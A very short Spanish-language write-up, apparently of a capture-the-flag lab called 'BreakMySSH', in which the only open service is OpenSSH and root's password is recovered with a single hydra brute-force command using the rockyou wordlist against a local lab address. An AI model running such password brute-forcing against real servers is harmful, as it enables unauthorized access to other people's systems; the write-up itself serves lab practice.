# BreakMySSH

Solo hay un OpenSSH abierto,
`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
Se obtiene la contraseña para root, se entra y no hace falta ESCALADA
